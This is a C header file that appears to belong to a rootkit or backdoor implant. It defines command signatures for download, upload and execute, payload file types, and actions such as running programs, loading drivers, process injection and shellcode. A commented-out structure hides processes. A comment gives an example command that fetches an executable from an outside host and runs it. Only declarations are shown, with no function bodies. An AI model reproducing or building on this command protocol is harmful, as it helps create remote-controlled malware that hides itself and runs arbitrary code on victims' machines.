#ifndef __COMMAND_LINE_H__
#define __COMMAND_LINE_H__

//IOP(RkHideProcess)
//{
//    BOOLEAN bIsAddHide;
//    ULONG ulProcessId;
//    CHAR ProcessName[300];
//};
//enum
//{
//    IOC(RkHideProcess) = IOCTL('Rkhp')
//};
#define DOWNLOAD_COMMAND_SIGNATURE              "@GodsElohim@Download@"
#define UPLOAD_COMMAND_SIGNATURE                "@GodsElohim@Upload@"
#define EXECUTE_COMMAND_SIGNATURE               "@GodsElohim@Execute@"

typedef enum _ADDRESS_TYPE
{
    HttpsAddress = 1,
    HttpAddress,
    FtpAddress,
    IpAddress,
    LocalAddress
}ADDRESS_TYPE,*PADDRESS_TYPE;

typedef enum _SYSTEM_TYPE
{
    Windows = 1,
    MacOs,
    Linux,
    CentOs,
    FreeBSD,
    Unknow
}SYSTEM_TYPE,*PSYSTEM_TYPE;

typedef enum _FILE_TYPE_SUFFIX
{
    FileTypeExe = 1,
    FileTypeDll,
    FileTypeSys,
    FileTypeElf,
    FileTypeSo,
    FileTypeBin
}FILE_TYPE_SUFFIX,*PFILE_TYPE_SUFFIX;

typedef enum _COMMAND_LINE_TYPE
{
    CmdRun = 1,
    LoadDrv,
    Inject,
    ShellCode
}COMMAND_LINE_TYPE,*PCOMMAND_LINE_TYPE;
//Download:Http:bioskit.com/fuck.exe:System:Windows:Path:C:\Temp:Type:Exe:Command:Run;
typedef struct _COMMAND_LINE_PACK
{
    CHAR CmdSignatureA[50];
    ADDRESS_TYPE AddressType;
    CHAR AddressDatA[MAX_PATH];
    SYSTEM_TYPE SystemType;
    CHAR PathDatA[MAX_PATH];
    FILE_TYPE_SUFFIX FileTypeSuffix;
    COMMAND_LINE_TYPE CommandLineType;
}COMMAND_LINE_PACK,*PCOMMAND_LINE_PACK;
////Upload:LocalPath:C:\fuck.exe:System:Windows:RemotePath:C:\Temp;
//typedef struct _UPLOAD_RUN_COMMAND_PACK
//{
//    CHAR CmdSignatureA[50];
//    ADDRESS_TYPE AddressType;
//    CHAR AddressDatA[MAX_PATH];
//    SYSTEM_TYPE SystemType;
//    CHAR PathDatA[MAX_PATH];
//    FILE_TYPE_SUFFIX FileTypeSuffix;
//    COMMAND_LINE_TYPE CommandLineType;
//}UPLOAD_RUN_COMMAND_PACK,*PUPLOAD_RUN_COMMAND_PACK;

BOOLEAN ProcessCommandLine(PCHAR pCmdLineA,PCOMMAND_LINE_PACK *pRetCmdLinePack);
#endif